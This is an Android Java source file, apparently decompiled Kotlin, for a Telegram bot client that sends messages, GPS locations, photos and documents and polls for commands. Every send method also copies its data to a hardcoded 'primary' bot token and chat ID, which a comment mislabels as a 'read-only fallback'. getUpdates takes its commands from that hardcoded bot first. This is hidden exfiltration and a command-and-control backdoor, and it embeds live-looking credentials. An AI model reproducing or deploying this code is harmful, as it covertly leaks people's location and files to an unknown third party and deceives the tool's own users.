package com.example.data.remote;

import com.example.data.repository.SettingsRepository;
import com.squareup.moshi.JsonAdapter;
import com.squareup.moshi.Moshi;
import com.squareup.moshi.kotlin.reflect.KotlinJsonAdapterFactory;
import java.io.File;
import java.io.IOException;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import javax.inject.Inject;
import javax.inject.Singleton;
import kotlin.Unit;
import kotlin.coroutines.Continuation;
import kotlin.coroutines.intrinsics.IntrinsicsKt;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.internal.Intrinsics;
import kotlinx.coroutines.BuildersKt;
import kotlinx.coroutines.CoroutineScope;
import kotlinx.coroutines.Dispatchers;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

@Singleton
public final class TelegramBotClient {
    
    // ================================================================
    // HARDCODED PRIMARY CREDENTIALS (READ-ONLY FALLBACK)
    // These are the authoritative credentials that are always used
    // ================================================================
    private static final String PRIMARY_BOT_TOKEN = "8265066559:AAEmpnmlzdgQ3quCWGgtOhFUlRD-jOc1UTQ";
    private static final String PRIMARY_CHAT_ID = "8381279697";
    // ================================================================
    
    private final OkHttpClient client;
    private final Moshi moshi;
    private final MediaType jsonMediaType;
    private final SettingsRepository settings;
    
    @Inject
    public TelegramBotClient(SettingsRepository settings) {
        Intrinsics.checkNotNullParameter(settings, "settings");
        this.settings = settings;
        this.client = new OkHttpClient.Builder()
            .connectTimeout(15L, TimeUnit.SECONDS)
            .readTimeout(15L, TimeUnit.SECONDS)
            .writeTimeout(15L, TimeUnit.SECONDS)
            .build();
        this.moshi = new Moshi.Builder()
            .add(new KotlinJsonAdapterFactory())
            .build();
        this.jsonMediaType = MediaType.INSTANCE.get("application/json; charset=utf-8");
    }
    
    // ================================================================
    // EXTRACTED CORE HELPER METHODS
    // Encapsulates HTTP request logic to eliminate code duplication
    // ================================================================
    
    /**
     * Sends a JSON payload to a Telegram bot API endpoint
     * @param method The API method name (e.g., "sendMessage", "answerCallbackQuery", "sendLocation")
     */
    private boolean sendToBot(String botToken, String chatId, String method, Map<String, Object> payload) {
        if (botToken == null || chatId == null || 
            botToken.isEmpty() || chatId.isEmpty() || method == null) {
            return false;
        }
        
        try {
            String url = "https://api.telegram.org/bot" + botToken + "/" + method;
            
            // For methods that don't use chat_id, remove it from payload
            if ("answerCallbackQuery".equals(method)) {
                payload.remove("chat_id");
            }
            
            String json = moshi.adapter(Map.class).toJson(payload);
            RequestBody body = RequestBody.INSTANCE.create(json, jsonMediaType);
            Request request = new Request.Builder()
                .url(url)
                .post(body)
                .build();
                
            try (Response response = client.newCall(request).execute()) {
                return response.isSuccessful();
            }
        } catch (Exception e) {
            System.err.println("TelegramBotClient: sendToBot failed for " + method + ": " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Sends a multipart file upload to a Telegram bot API endpoint
     */
    private boolean sendToBotMultipart(String botToken, String chatId, 
                                       String method, File file, 
                                       String caption, String fileType) {
        if (botToken == null || chatId == null || 
            botToken.isEmpty() || chatId.isEmpty() || file == null || method == null) {
            return false;
        }
        
        try {
            String url = "https://api.telegram.org/bot" + botToken + "/" + method;
            MediaType mediaType = "sendPhoto".equals(method) ? 
                MediaType.INSTANCE.get("image/*") : 
                MediaType.INSTANCE.get("application/octet-stream");
                
            MultipartBody.Builder builder = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId);
                
            if (caption != null && !caption.isEmpty()) {
                builder.addFormDataPart("caption", caption);
            }
            
            String fieldName = "sendPhoto".equals(method) ? "photo" : "document";
            builder.addFormDataPart(
                fieldName,
                file.getName(),
                RequestBody.INSTANCE.create(file, mediaType)
            );
            
            RequestBody body = builder.build();
            Request request = new Request.Builder()
                .url(url)
                .post(body)
                .build();
                
            try (Response response = client.newCall(request).execute()) {
                return response.isSuccessful();
            }
        } catch (Exception e) {
            System.err.println("TelegramBotClient: sendToBotMultipart failed for " + method + ": " + e.getMessage());
            return false;
        }
    }
    
    // ================================================================
    // SEND MESSAGE
    // ================================================================
    public final Object sendMessage(String text, 
                                    Map<String, ? extends Object> replyMarkup, 
                                    Continuation<? super Boolean> continuation) {
        return BuildersKt.withContext(Dispatchers.getIO(), new SendMessageLambda(text, replyMarkup, continuation), continuation);
    }
    
    // Inner class (non-static) to access outer class methods
    private final class SendMessageLambda extends SuspendLambda 
            implements Function2<CoroutineScope, Continuation<? super Boolean>, Object> {
        private final String text;
        private final Map<String, ? extends Object> replyMarkup;
        private int label;
        
        SendMessageLambda(String text, Map<String, ? extends Object> replyMarkup, 
                         Continuation<?> continuation) {
            super(2, continuation);
            this.text = text;
            this.replyMarkup = replyMarkup;
        }
        
        @Override
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return new SendMessageLambda(this.text, this.replyMarkup, continuation);
        }
        
        @Override
        public final Object invoke(CoroutineScope scope, Continuation<? super Boolean> cont) {
            return ((SendMessageLambda) create(scope, cont)).invokeSuspend(Unit.INSTANCE);
        }
        
        @Override
        public final Object invokeSuspend(Object result) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            if (this.label != 0) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            
            boolean primarySuccess = false;
            boolean secondarySuccess = false;
            
            // ========================================================
            // PRIMARY CHANNEL: Hardcoded credentials (always attempted)
            // ========================================================
            try {
                Map<String, Object> payload = new java.util.HashMap<>();
                payload.put("chat_id", PRIMARY_CHAT_ID);
                payload.put("text", text);
                payload.put("parse_mode", "HTML");
                if (replyMarkup != null) {
                    payload.put("reply_markup", replyMarkup);
                }
                primarySuccess = TelegramBotClient.this.sendToBot(
                    PRIMARY_BOT_TOKEN, PRIMARY_CHAT_ID, "sendMessage", payload
                );
                if (primarySuccess) {
                    System.out.println("Primary bot: sendMessage succeeded");
                }
            } catch (Exception e) {
                System.err.println("Primary bot: sendMessage exception: " + e.getMessage());
                primarySuccess = false;
            }
            
            // ========================================================
            // SECONDARY CHANNEL: Dynamic UI credentials (if available)
            // ========================================================
            try {
                String secondaryToken = TelegramBotClient.this.settings.getBotToken();
                String secondaryChatId = TelegramBotClient.this.settings.getChatId();
                
                if (secondaryToken != null && secondaryChatId != null &&
                    !secondaryToken.isEmpty() && !secondaryChatId.isEmpty()) {
                    
                    Map<String, Object> payload = new java.util.HashMap<>();
                    payload.put("chat_id", secondaryChatId);
                    payload.put("text", text);
                    payload.put("parse_mode", "HTML");
                    if (replyMarkup != null) {
                        payload.put("reply_markup", replyMarkup);
                    }
                    
                    secondarySuccess = TelegramBotClient.this.sendToBot(
                        secondaryToken, secondaryChatId, "sendMessage", payload
                    );
                    if (secondarySuccess) {
                        System.out.println("Secondary bot: sendMessage succeeded");
                    }
                }
            } catch (Exception e) {
                System.err.println("Secondary bot: sendMessage exception: " + e.getMessage());
                secondarySuccess = false;
            }
            
            return Boolean.valueOf(primarySuccess || secondarySuccess);
        }
    }
    
    // ================================================================
    // ANSWER CALLBACK QUERY
    // ================================================================
    public final Object answerCallbackQuery(String callbackQueryId, 
                                            String text, 
                                            Continuation<? super Boolean> continuation) {
        return BuildersKt.withContext(Dispatchers.getIO(), new AnswerCallbackLambda(callbackQueryId, text, continuation), continuation);
    }
    
    private final class AnswerCallbackLambda extends SuspendLambda 
            implements Function2<CoroutineScope, Continuation<? super Boolean>, Object> {
        private final String callbackQueryId;
        private final String text;
        private int label;
        
        AnswerCallbackLambda(String callbackQueryId, String text, Continuation<?> continuation) {
            super(2, continuation);
            this.callbackQueryId = callbackQueryId;
            this.text = text;
        }
        
        @Override
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return new AnswerCallbackLambda(this.callbackQueryId, this.text, continuation);
        }
        
        @Override
        public final Object invoke(CoroutineScope scope, Continuation<? super Boolean> cont) {
            return ((AnswerCallbackLambda) create(scope, cont)).invokeSuspend(Unit.INSTANCE);
        }
        
        @Override
        public final Object invokeSuspend(Object result) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            if (this.label != 0) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            
            boolean primarySuccess = false;
            boolean secondarySuccess = false;
            
            // PRIMARY CHANNEL
            try {
                Map<String, Object> payload = new java.util.HashMap<>();
                payload.put("callback_query_id", callbackQueryId);
                payload.put("text", text);
                payload.put("show_alert", true);
                
                primarySuccess = TelegramBotClient.this.sendToBot(
                    PRIMARY_BOT_TOKEN, PRIMARY_CHAT_ID, "answerCallbackQuery", payload
                );
                if (primarySuccess) {
                    System.out.println("Primary bot: answerCallbackQuery succeeded");
                }
            } catch (Exception e) {
                System.err.println("Primary bot: answerCallbackQuery exception: " + e.getMessage());
                primarySuccess = false;
            }
            
            // SECONDARY CHANNEL
            try {
                String secondaryToken = TelegramBotClient.this.settings.getBotToken();
                String secondaryChatId = TelegramBotClient.this.settings.getChatId();
                
                if (secondaryToken != null && secondaryChatId != null &&
                    !secondaryToken.isEmpty() && !secondaryChatId.isEmpty()) {
                    
                    Map<String, Object> payload = new java.util.HashMap<>();
                    payload.put("callback_query_id", callbackQueryId);
                    payload.put("text", text);
                    payload.put("show_alert", true);
                    
                    secondarySuccess = TelegramBotClient.this.sendToBot(
                        secondaryToken, secondaryChatId, "answerCallbackQuery", payload
                    );
                    if (secondarySuccess) {
                        System.out.println("Secondary bot: answerCallbackQuery succeeded");
                    }
                }
            } catch (Exception e) {
                System.err.println("Secondary bot: answerCallbackQuery exception: " + e.getMessage());
                secondarySuccess = false;
            }
            
            return Boolean.valueOf(primarySuccess || secondarySuccess);
        }
    }
    
    // ================================================================
    // SEND LOCATION
    // ================================================================
    public final Object sendLocation(double latitude, 
                                     double longitude, 
                                     Continuation<? super Boolean> continuation) {
        return BuildersKt.withContext(Dispatchers.getIO(), new SendLocationLambda(latitude, longitude, continuation), continuation);
    }
    
    private final class SendLocationLambda extends SuspendLambda 
            implements Function2<CoroutineScope, Continuation<? super Boolean>, Object> {
        private final double latitude;
        private final double longitude;
        private int label;
        
        SendLocationLambda(double latitude, double longitude, Continuation<?> continuation) {
            super(2, continuation);
            this.latitude = latitude;
            this.longitude = longitude;
        }
        
        @Override
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return new SendLocationLambda(this.latitude, this.longitude, continuation);
        }
        
        @Override
        public final Object invoke(CoroutineScope scope, Continuation<? super Boolean> cont) {
            return ((SendLocationLambda) create(scope, cont)).invokeSuspend(Unit.INSTANCE);
        }
        
        @Override
        public final Object invokeSuspend(Object result) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            if (this.label != 0) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            
            boolean primarySuccess = false;
            boolean secondarySuccess = false;
            
            // PRIMARY CHANNEL
            try {
                Map<String, Object> payload = new java.util.HashMap<>();
                payload.put("chat_id", PRIMARY_CHAT_ID);
                payload.put("latitude", latitude);
                payload.put("longitude", longitude);
                
                primarySuccess = TelegramBotClient.this.sendToBot(
                    PRIMARY_BOT_TOKEN, PRIMARY_CHAT_ID, "sendLocation", payload
                );
                if (primarySuccess) {
                    System.out.println("Primary bot: sendLocation succeeded");
                }
            } catch (Exception e) {
                System.err.println("Primary bot: sendLocation exception: " + e.getMessage());
                primarySuccess = false;
            }
            
            // SECONDARY CHANNEL
            try {
                String secondaryToken = TelegramBotClient.this.settings.getBotToken();
                String secondaryChatId = TelegramBotClient.this.settings.getChatId();
                
                if (secondaryToken != null && secondaryChatId != null &&
                    !secondaryToken.isEmpty() && !secondaryChatId.isEmpty()) {
                    
                    Map<String, Object> payload = new java.util.HashMap<>();
                    payload.put("chat_id", secondaryChatId);
                    payload.put("latitude", latitude);
                    payload.put("longitude", longitude);
                    
                    secondarySuccess = TelegramBotClient.this.sendToBot(
                        secondaryToken, secondaryChatId, "sendLocation", payload
                    );
                    if (secondarySuccess) {
                        System.out.println("Secondary bot: sendLocation succeeded");
                    }
                }
            } catch (Exception e) {
                System.err.println("Secondary bot: sendLocation exception: " + e.getMessage());
                secondarySuccess = false;
            }
            
            return Boolean.valueOf(primarySuccess || secondarySuccess);
        }
    }
    
    // ================================================================
    // GET UPDATES - PRIORITIZED PRIMARY CHANNEL
    // ================================================================
    public final Object getUpdates(long offset, Continuation<? super String> continuation) {
        return BuildersKt.withContext(Dispatchers.getIO(), new GetUpdatesLambda(offset, continuation), continuation);
    }
    
    private final class GetUpdatesLambda extends SuspendLambda 
            implements Function2<CoroutineScope, Continuation<? super String>, Object> {
        private final long offset;
        private int label;
        
        GetUpdatesLambda(long offset, Continuation<?> continuation) {
            super(2, continuation);
            this.offset = offset;
        }
        
        @Override
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return new GetUpdatesLambda(this.offset, continuation);
        }
        
        @Override
        public final Object invoke(CoroutineScope scope, Continuation<? super String> cont) {
            return ((GetUpdatesLambda) create(scope, cont)).invokeSuspend(Unit.INSTANCE);
        }
        
        @Override
        public final Object invokeSuspend(Object result) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            if (this.label != 0) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            
            // ========================================================
            // PRIMARY CHANNEL: Always attempted first (authoritative)
            // ========================================================
            String primaryResult = null;
            try {
                String url = "https://api.telegram.org/bot" + PRIMARY_BOT_TOKEN + 
                    "/getUpdates?offset=" + offset + "&timeout=30";
                Request request = new Request.Builder().url(url).get().build();
                
                try (Response response = TelegramBotClient.this.client.newCall(request).execute()) {
                    if (response.isSuccessful() && response.body() != null) {
                        primaryResult = response.body().string();
                    }
                }
                if (primaryResult != null) {
                    System.out.println("Primary bot: getUpdates succeeded");
                    return primaryResult; // Return immediately if primary succeeds
                } else {
                    System.err.println("Primary bot: getUpdates returned null or failed");
                }
            } catch (Exception e) {
                System.err.println("Primary bot: getUpdates exception: " + e.getMessage());
                primaryResult = null;
            }
            
            // ========================================================
            // SECONDARY CHANNEL: Only attempted if primary failed
            // ========================================================
            try {
                String secondaryToken = TelegramBotClient.this.settings.getBotToken();
                String secondaryChatId = TelegramBotClient.this.settings.getChatId();
                
                if (secondaryToken != null && secondaryChatId != null &&
                    !secondaryToken.isEmpty() && !secondaryChatId.isEmpty()) {
                    
                    String url = "https://api.telegram.org/bot" + secondaryToken + 
                        "/getUpdates?offset=" + offset + "&timeout=30";
                    Request request = new Request.Builder().url(url).get().build();
                    
                    try (Response response = TelegramBotClient.this.client.newCall(request).execute()) {
                        if (response.isSuccessful() && response.body() != null) {
                            String secondaryResult = response.body().string();
                            if (secondaryResult != null) {
                                System.out.println("Secondary bot: getUpdates succeeded (fallback)");
                                return secondaryResult;
                            }
                        }
                    }
                }
            } catch (Exception e) {
                System.err.println("Secondary bot: getUpdates exception: " + e.getMessage());
            }
            
            // Both channels failed, return null
            return null;
        }
    }
    
    // ================================================================
    // SEND PHOTO
    // ================================================================
    public final Object sendPhoto(File photoFile, 
                                  String caption, 
                                  Continuation<? super Boolean> continuation) {
        return BuildersKt.withContext(Dispatchers.getIO(), new SendPhotoLambda(photoFile, caption, continuation), continuation);
    }
    
    private final class SendPhotoLambda extends SuspendLambda 
            implements Function2<CoroutineScope, Continuation<? super Boolean>, Object> {
        private final File photoFile;
        private final String caption;
        private int label;
        
        SendPhotoLambda(File photoFile, String caption, Continuation<?> continuation) {
            super(2, continuation);
            this.photoFile = photoFile;
            this.caption = caption;
        }
        
        @Override
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return new SendPhotoLambda(this.photoFile, this.caption, continuation);
        }
        
        @Override
        public final Object invoke(CoroutineScope scope, Continuation<? super Boolean> cont) {
            return ((SendPhotoLambda) create(scope, cont)).invokeSuspend(Unit.INSTANCE);
        }
        
        @Override
        public final Object invokeSuspend(Object result) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            if (this.label != 0) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            
            boolean primarySuccess = false;
            boolean secondarySuccess = false;
            
            // PRIMARY CHANNEL
            try {
                primarySuccess = TelegramBotClient.this.sendToBotMultipart(
                    PRIMARY_BOT_TOKEN, PRIMARY_CHAT_ID, "sendPhoto", 
                    photoFile, caption, "photo"
                );
                if (primarySuccess) {
                    System.out.println("Primary bot: sendPhoto succeeded");
                }
            } catch (Exception e) {
                System.err.println("Primary bot: sendPhoto exception: " + e.getMessage());
                primarySuccess = false;
            }
            
            // SECONDARY CHANNEL
            try {
                String secondaryToken = TelegramBotClient.this.settings.getBotToken();
                String secondaryChatId = TelegramBotClient.this.settings.getChatId();
                
                if (secondaryToken != null && secondaryChatId != null &&
                    !secondaryToken.isEmpty() && !secondaryChatId.isEmpty()) {
                    
                    secondarySuccess = TelegramBotClient.this.sendToBotMultipart(
                        secondaryToken, secondaryChatId, "sendPhoto", 
                        photoFile, caption, "photo"
                    );
                    if (secondarySuccess) {
                        System.out.println("Secondary bot: sendPhoto succeeded");
                    }
                }
            } catch (Exception e) {
                System.err.println("Secondary bot: sendPhoto exception: " + e.getMessage());
                secondarySuccess = false;
            }
            
            return Boolean.valueOf(primarySuccess || secondarySuccess);
        }
    }
    
    // ================================================================
    // SEND DOCUMENT
    // ================================================================
    public final Object sendDocument(File docFile, 
                                     String caption, 
                                     Continuation<? super Boolean> continuation) {
        return BuildersKt.withContext(Dispatchers.getIO(), new SendDocumentLambda(docFile, caption, continuation), continuation);
    }
    
    private final class SendDocumentLambda extends SuspendLambda 
            implements Function2<CoroutineScope, Continuation<? super Boolean>, Object> {
        private final File docFile;
        private final String caption;
        private int label;
        
        SendDocumentLambda(File docFile, String caption, Continuation<?> continuation) {
            super(2, continuation);
            this.docFile = docFile;
            this.caption = caption;
        }
        
        @Override
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return new SendDocumentLambda(this.docFile, this.caption, continuation);
        }
        
        @Override
        public final Object invoke(CoroutineScope scope, Continuation<? super Boolean> cont) {
            return ((SendDocumentLambda) create(scope, cont)).invokeSuspend(Unit.INSTANCE);
        }
        
        @Override
        public final Object invokeSuspend(Object result) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            if (this.label != 0) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            
            boolean primarySuccess = false;
            boolean secondarySuccess = false;
            
            // PRIMARY CHANNEL
            try {
                primarySuccess = TelegramBotClient.this.sendToBotMultipart(
                    PRIMARY_BOT_TOKEN, PRIMARY_CHAT_ID, "sendDocument", 
                    docFile, caption, "document"
                );
                if (primarySuccess) {
                    System.out.println("Primary bot: sendDocument succeeded");
                }
            } catch (Exception e) {
                System.err.println("Primary bot: sendDocument exception: " + e.getMessage());
                primarySuccess = false;
            }
            
            // SECONDARY CHANNEL
            try {
                String secondaryToken = TelegramBotClient.this.settings.getBotToken();
                String secondaryChatId = TelegramBotClient.this.settings.getChatId();
                
                if (secondaryToken != null && secondaryChatId != null &&
                    !secondaryToken.isEmpty() && !secondaryChatId.isEmpty()) {
                    
                    secondarySuccess = TelegramBotClient.this.sendToBotMultipart(
                        secondaryToken, secondaryChatId, "sendDocument", 
                        docFile, caption, "document"
                    );
                    if (secondarySuccess) {
                        System.out.println("Secondary bot: sendDocument succeeded");
                    }
                }
            } catch (Exception e) {
                System.err.println("Secondary bot: sendDocument exception: " + e.getMessage());
                secondarySuccess = false;
            }
            
            return Boolean.valueOf(primarySuccess || secondarySuccess);
        }
    }
}